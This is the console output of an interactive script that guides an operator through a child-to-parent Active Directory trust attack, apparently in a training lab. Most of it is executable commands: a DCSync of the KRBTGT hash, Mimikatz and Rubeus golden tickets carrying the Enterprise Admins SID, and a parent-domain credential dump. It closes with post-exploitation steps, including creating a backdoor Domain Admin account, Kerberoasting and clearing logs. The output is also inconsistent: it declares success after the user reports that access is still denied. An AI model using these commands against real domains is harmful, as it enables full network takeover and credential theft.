
+---------------------------------------------------------------+
¦                                                               ¦
¦     Child ? Parent Domain Trust Attack Guide                 ¦
¦     Complete Step-by-Step Walkthrough                        ¦
¦                                                               ¦
+---------------------------------------------------------------+

This script will guide you through the complete Child ? Parent domain attack.
You will execute each command manually and provide the results.


Press any key to continue to next step...

[*] Detecting current environment...
[+] Current Domain: LOGISTICS.INLANEFREIGHT.LOCAL
[+] NetBIOS Name: LOGISTICS
[+] Detected parent domain: INLANEFREIGHT.LOCAL

[+] Attack Configuration:
    Child Domain:  LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
    Parent Domain: INLANEFREIGHT.LOCAL (INLANEFREIGHT)
    Fake User:     hacker

Press any key to continue to next step...

+---------------------------------------------------------------+
¦  STEP 1 : Open PowerShell as Administrator & Launch Mimikatz
+---------------------------------------------------------------+

[*] Description:
    We need to run Mimikatz with administrator privileges to perform DCSync attacks.

[?] Why this step?
    DCSync requires administrator privileges and the ability to impersonate a Domain Controller. Mimikatz provides this capability.

[>] Command to execute:
????????????????????????????????????????????????????????????
# In an Administrator PowerShell window:
cd C:\Tools\mimikatz
.\mimikatz.exe
????????????????????????????????????????????????????????????

[!] Important notes:
    • Right-click PowerShell ? Run as Administrator
    • Navigate to your Mimikatz directory
    • Common locations: C:\Tools\, Desktop, Downloads
    • Alternative: Use x64\mimikatz.exe for 64-bit systems

Press any key to continue to next step...

+---------------------------------------------------------------+
¦  STEP 2 : Extract KRBTGT Hash from Child Domain
+---------------------------------------------------------------+

[*] Description:
    Use DCSync to extract the KRBTGT account hash from the child domain.

[?] Why this step?
    We need the KRBTGT hash to create a Golden Ticket. KRBTGT is the Kerberos service account that signs all TGTs (Ticket Granting Tickets).

Why we chose 'LOGISTICS' (LOGISTICS):
    • This is the CURRENT domain we have admin access to (the child domain)
    • We cannot DCSync the parent domain yet (no access)
    • The KRBTGT hash from the CHILD domain is what we use to create our Golden Ticket
    • The Golden Ticket will include the Parent Domain's Enterprise Admins SID (ExtraSids attack)
    • This allows us to escalate from child domain admin ? parent domain admin

[>] Command to execute:
????????????????????????????????????????????????????????????
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
????????????????????????????????????????????????????????????

[+] Expected output:
    Look for: 'Hash NTLM: [32 character hex string]'

[!] Important notes:
    • The NTLM hash is what we need (not AES keys)
    • Copy the entire 32-character hash
    • You'll also see the domain SID in this output

Press any key to continue to next step...

[?] Enter the KRBTGT NTLM hash (32 characters): 9d765b482771505cbe97411065964d5f

+---------------------------------------------------------------+
¦  STEP 3 : Get Child Domain SID (From Mimikatz Output)
+---------------------------------------------------------------+

[*] Description:
    The domain SID is visible in the DCSync output above, but we can also get it with PowerView.

[?] Why this step?
    We need the child domain's SID to create the Golden Ticket. The SID identifies the domain and will be used as the base for our ticket.

[+] Expected output:
    The SID is in the Mimikatz output under 'Object Security ID'

[!] Important notes:
    • Format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
    • This should be visible in the DCSync output above
    • Last number (RID) for KRBTGT is typically 502

Press any key to continue to next step...

+---------------------------------------------------------------+
¦  STEP 4 : Alternative: Use PowerView to Get Domain SID
+---------------------------------------------------------------+

[*] Description:
    If you didn't see the SID in Mimikatz output, use PowerView.

[>] Command to execute:
????????????????????????????????????????????????????????????
Get-DomainSID
????????????????????????????????????????????????????????????

[!] Important notes:
    • Requires PowerView to be loaded
    • Alternative: Get-ADDomain | Select-Object DomainSID
    • Alternative: (Get-ADDomain).DomainSID.Value

Press any key to continue to next step...

[?] Enter the Child Domain SID: S-1-5-21-2806153819-209893948-922872689

+---------------------------------------------------------------+
¦  STEP 5 : Get Enterprise Admins SID from Parent Domain
+---------------------------------------------------------------+

[*] Description:
    Query the parent domain for the Enterprise Admins group SID.

[?] Why this step?
    Enterprise Admins is a group that exists ONLY in the forest root domain and has admin rights across ALL domains in the forest. By adding this SID to our Golden Ticket (ExtraSids), we gain Enterprise Admin privileges in the parent domain!

[>] Command to execute:
????????????????????????????????????????????????????????????
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
????????????????????????????????????????????????????????????

[+] Expected output:
    objectsid : S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-519

[!] Important notes:
    • The SID will end with -519 (Enterprise Admins RID)
    • Alternative: Get-ADGroup -Server INLANEFREIGHT.LOCAL -Identity 'Enterprise Admins'
    • This is the key to the ExtraSids attack!
    • Format: S-1-5-21-{Parent-Domain-SID}-519

Press any key to continue to next step...

[?] Enter the Enterprise Admins SID: S-1-5-21-3842939050-3880317879-2865463114-519

+---------------------------------------------------------------+
¦  STEP 6 : Confirm We Have NO Access to Parent Domain (Yet)
+---------------------------------------------------------------+

[*] Description:
    Test that we currently cannot access the parent domain controller.

[?] Why this step?
    This proves we don't have access YET. After the Golden Ticket attack, this same command will work!

[>] Command to execute:
????????????????????????????????????????????????????????????
ls \\academy-ea-dc01.INLANEFREIGHT.LOCAL\c$
????????????????????????????????????????????????????????????

[+] Expected output:
    Access is denied

[!] Important notes:
    • Try: ls \\INLANEFREIGHT.LOCAL\c$
    • Try: ls \\DC01.INLANEFREIGHT.LOCAL\c$
    • You should get 'Access is denied' error
    • If you already have access, the attack may not be necessary!

Press any key to continue to next step...

[?] Did you get 'Access Denied'? (Y/N): Y

+---------------------------------------------------------------+
¦              COLLECTED DATA SUMMARY                           ¦
+---------------------------------------------------------------+

+-------------------------------------------------------------+
¦ Child Domain:            LOGISTICS.INLANEFREIGHT.LOCAL  ¦
¦ Child Domain SID:        S-1-5-21-2806153819-209893948-922872689 ¦
¦ Enterprise Admins SID:   S-1-5-21-3842939050-3880317879-2865463114-519 ¦
¦ KRBTGT Hash:             9d765b482771505cbe97411065964d5f ¦
¦ Parent Domain:           INLANEFREIGHT.LOCAL            ¦
+-------------------------------------------------------------+

Press any key to continue to next step...

+---------------------------------------------------------------+
¦  STEP 7 : Create Golden Ticket with ExtraSids (Mimikatz)
+---------------------------------------------------------------+

[*] Description:
    Now we create the Golden Ticket that includes the Enterprise Admins SID!

[?] Why this step?
    This is the CORE of the ExtraSids attack!

Command breakdown:
    /user:hacker              ? Fake username (doesn't need to exist)
    /domain:LOGISTICS.INLANEFREIGHT.LOCAL             ? Our current domain (child)
    /sid:S-1-5-21-2806153819-209893948-922872689             ? Child domain SID
    /krbtgt:9d765b482771505cbe97411065964d5f              ? KRBTGT hash from child domain
    /sids:S-1-5-21-3842939050-3880317879-2865463114-519                     ? EXTRA SID = Enterprise Admins from PARENT!
    /ptt                             ? Pass-The-Ticket (inject into memory)

The magic: By adding the parent's Enterprise Admins SID to a ticket from the CHILD domain,
we can access the PARENT domain as if we were Enterprise Admins!

[>] Command to execute:
????????????????????????????????????????????????????????????
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
????????????????????????????????????????????????????????????

[+] Expected output:
    [+] Ticket successfully imported!

[!] Important notes:
    • The ticket is injected directly into memory (/ptt)
    • No need to save to file
    • The ticket will work for ~10 hours by default
    • You should see 'Golden ticket for <user> successfully submitted'

Press any key to continue to next step...

[?] Did Mimikatz successfully create the ticket? (Y/N): Y

+---------------------------------------------------------------+
¦  STEP 8 : Confirm Kerberos Ticket is in Memory
+---------------------------------------------------------------+

[*] Description:
    Verify that our Golden Ticket was successfully injected.

[?] Why this step?
    klist shows all Kerberos tickets currently in memory. We should see our fake user's ticket.

[>] Command to execute:
????????????????????????????????????????????????????????????
klist
????????????????????????????????????????????????????????????

[+] Expected output:
    Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL

[!] Important notes:
    • Look for your fake username in the output
    • The ticket should be for 'krbtgt' service
    • Ticket Flags should include 'forwardable renewable initial'
    • If you don't see it, the injection failed

Press any key to continue to next step...

+---------------------------------------------------------------+
¦  STEP 9 : Test Access to Parent Domain Controller
+---------------------------------------------------------------+

[*] Description:
    Now try accessing the parent domain - it should work!

[?] Why this step?
    If the ExtraSids attack worked, we now have Enterprise Admin rights in the parent domain!

[>] Command to execute:
????????????????????????????????????????????????????????????
ls \\academy-ea-dc01.INLANEFREIGHT.LOCAL\c$
????????????????????????????????????????????????????????????

[+] Expected output:
    Directory listing of C:\ drive

[!] Important notes:
    • You should now see files/folders (not 'Access Denied'!)
    • Try multiple DCs if one fails: DC01, DC02, AD01, etc.
    • Alternative: ls \\INLANEFREIGHT.LOCAL\SYSVOL
    • This confirms SUCCESSFUL compromise!

Press any key to continue to next step...

[?] Do you now have access to the parent domain? (Y/N): N

[!] Access still denied. Possible issues:
    • SID filtering may be enabled on the trust
    • Wrong Enterprise Admins SID
    • Golden ticket not created correctly

Press any key to continue to next step...

+---------------------------------------------------------------+
¦              ALTERNATIVE METHOD: RUBEUS                       ¦
+---------------------------------------------------------------+

If you prefer to use Rubeus instead of Mimikatz, here's how:

+---------------------------------------------------------------+
¦  STEP A1 : Confirm No Access (Rubeus Method)
+---------------------------------------------------------------+

[*] Description:
    First, confirm you don't have access (same as before).

[>] Command to execute:
????????????????????????????????????????????????????????????
ls \\academy-ea-dc01.INLANEFREIGHT.LOCAL\c$
????????????????????????????????????????????????????????????

[+] Expected output:
    Access is denied

+---------------------------------------------------------------+
¦  STEP A2 : Create Golden Ticket with Rubeus
+---------------------------------------------------------------+

[*] Description:
    Use Rubeus to create and inject the Golden Ticket.

[?] Why this step?
    Rubeus is a more modern alternative to Mimikatz for Kerberos attacks. The command parameters are similar but slightly different syntax.

Parameter differences from Mimikatz:
    /rc4:    ? NTLM hash (instead of /krbtgt:)
    /domain: ? Same
    /sid:    ? Same
    /sids:   ? Same (ExtraSids)
    /user:   ? Same
    /ptt:    ? Same (Pass-The-Ticket)

[>] Command to execute:
????????????????????????????????????????????????????????????
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
????????????????????????????????????????????????????????????

[+] Expected output:
    [+] Ticket successfully imported!

[!] Important notes:
    • Rubeus uses /rc4: instead of /krbtgt:
    • The rest is identical to Mimikatz
    • Rubeus is less likely to be flagged by AV
    • Output will show base64 encoded ticket

+---------------------------------------------------------------+
¦  STEP A3 : Confirm Ticket with Rubeus
+---------------------------------------------------------------+

[*] Description:
    Verify the ticket is in memory.

[>] Command to execute:
????????????????????????????????????????????????????????????
klist
????????????????????????????????????????????????????????????

[+] Expected output:
    Same as Step 8 - ticket for fake user should be visible

Press any key to continue to next step...

+---------------------------------------------------------------+
¦         EXPLOITATION: DCSYNC PARENT DOMAIN                    ¦
+---------------------------------------------------------------+

+---------------------------------------------------------------+
¦  STEP 10 : DCSync Attack on Parent Domain
+---------------------------------------------------------------+

[*] Description:
    Now extract credentials from the parent domain!

[?] Why this step?
    With Enterprise Admin rights, we can now DCSync ANY account from the parent domain, including Domain Admins and the Administrator!

CRITICAL: Notice the /domain:INLANEFREIGHT.LOCAL parameter!
    • Without this, Mimikatz will query YOUR current domain (LOGISTICS)
    • The user 'INLANEFREIGHT\lab_adm' doesn't exist in LOGISTICS domain
    • You'll get ERROR: 'invalid dwOutVersion (6) and/or cNumObjects (0)'
    • The /domain: parameter tells Mimikatz which DC to contact
    • This is ESSENTIAL for cross-domain DCSync attacks!

[>] Command to execute:
????????????????????????????????????????????????????????????
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
????????????????????????????????????????????????????????????

[+] Expected output:
    NTLM hash of lab_adm user

[!] Important notes:
    • MUST use /domain:INLANEFREIGHT.LOCAL for cross-domain DCSync!
    • Try: lsadump::dcsync /user:INLANEFREIGHT\Administrator /domain:INLANEFREIGHT.LOCAL
    • Try: lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all /csv (all hashes!)
    • This proves complete compromise of parent domain

Press any key to continue to next step...

+---------------------------------------------------------------+
¦  STEP 11 : DCSync with Explicit Domain (Multi-Domain)
+---------------------------------------------------------------+

[*] Description:
    When dealing with multiple domains, specify the exact domain.

[?] Why this step?
    In complex environments with multiple domains, we need to specify which domain controller to query. This ensures we're targeting the correct domain.

[>] Command to execute:
????????????????????????????????????????????????????????????
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
????????????????????????????????????????????????????????????

[!] Important notes:
    • Use this when target domain ? current user's domain
    • Explicitly specifies the DC to query
    • More reliable in multi-domain forests
    • Format: /user:DOMAIN\username /domain:DOMAIN.FQDN

Press any key to continue to next step...

[?] Did you successfully extract the hash? (Y/N): Y

[?] (Optional) Paste the NTLM hash: 663715a1a8b957e8e9943cc98ea451b6


+---------------------------------------------------------------+
¦                                                               ¦
¦              ATTACK COMPLETED SUCCESSFULLY!                   ¦
¦                                                               ¦
+---------------------------------------------------------------+

[+] Congratulations! You've successfully compromised the parent domain!

+---------------------------------------------------------------+
¦              COLLECTED DATA SUMMARY                           ¦
+---------------------------------------------------------------+

+-------------------------------------------------------------+
¦ Admin Hash:              663715a1a8b957e8e9943cc98ea451b6 ¦
¦ Child Domain:            LOGISTICS.INLANEFREIGHT.LOCAL  ¦
¦ Child Domain SID:        S-1-5-21-2806153819-209893948-922872689 ¦
¦ Enterprise Admins SID:   S-1-5-21-3842939050-3880317879-2865463114-519 ¦
¦ KRBTGT Hash:             9d765b482771505cbe97411065964d5f ¦
¦ Parent Domain:           INLANEFREIGHT.LOCAL            ¦
+-------------------------------------------------------------+

+---------------------------------------------------------------+
¦              NEXT STEPS & POST-EXPLOITATION                   ¦
+---------------------------------------------------------------+

1. CREATE PERSISTENT ACCESS:
   net user backdoor Password123! /add /domain:INLANEFREIGHT.LOCAL
   net group "Domain Admins" backdoor /add /domain:INLANEFREIGHT.LOCAL

2. DUMP ALL DOMAIN CREDENTIALS:
   mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all /csv
   # Exports all password hashes to CSV

3. ACCESS DOMAIN CONTROLLERS:
   Enter-PSSession -ComputerName DC01.INLANEFREIGHT.LOCAL
   \\DC01.INLANEFREIGHT.LOCAL\c$

4. KERBEROAST HIGH-VALUE ACCOUNTS:
   Get-DomainUser -SPN -Domain INLANEFREIGHT.LOCAL | Get-DomainSPNTicket -Format Hashcat

5. SEARCH FOR SENSITIVE DATA:
   ls \\INLANEFREIGHT.LOCAL\SYSVOL -Recurse | Where-Object {$_.Name -like '*password*'}
   # Look for Group Policy Preferences, scripts with passwords, etc.

6. ENUMERATE ADMIN ACCOUNTS:
   Get-DomainGroupMember -Domain INLANEFREIGHT.LOCAL -Identity 'Domain Admins'
   Get-DomainGroupMember -Domain INLANEFREIGHT.LOCAL -Identity 'Enterprise Admins'

7. LATERAL MOVEMENT:
   # Use extracted hashes for Pass-the-Hash attacks
   # Create Silver Tickets for specific services
   # Access other domain controllers and servers

+---------------------------------------------------------------+
¦              CLEANUP & OPSEC                                  ¦
+---------------------------------------------------------------+

[!] Remember to clean up after the engagement:
    • Clear Kerberos tickets: klist purge
    • Remove created accounts: net user backdoor /delete
    • Clear PowerShell history: Clear-History
    • Remove tools from disk
    • Clear Windows Event Logs (if authorized)

+---------------------------------------------------------------+
¦              COMPLETE COMMAND REFERENCE                       ¦
+---------------------------------------------------------------+

All commands used in this attack:
????????????????????????????????????????????????????????????
# 1. DCSync child domain KRBTGT
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

# 2. Get child domain SID
Get-DomainSID

# 3. Get Enterprise Admins SID
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid

# 4. Test access (before)
ls \\INLANEFREIGHT.LOCAL\c$

# 5. Create Golden Ticket (Mimikatz)
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

# 6. Create Golden Ticket (Rubeus)
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

# 7. Verify ticket
klist

# 8. Test access (after)
ls \\INLANEFREIGHT.LOCAL\c$

# 9. DCSync parent domain
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
????????????????????????????????????????????????????????????

[+] Attack guide completed!
[+] You now have full control over the parent domain: INLANEFREIGHT.LOCAL

[*] Good luck and happy hunting! ??

PS C:\Tools>

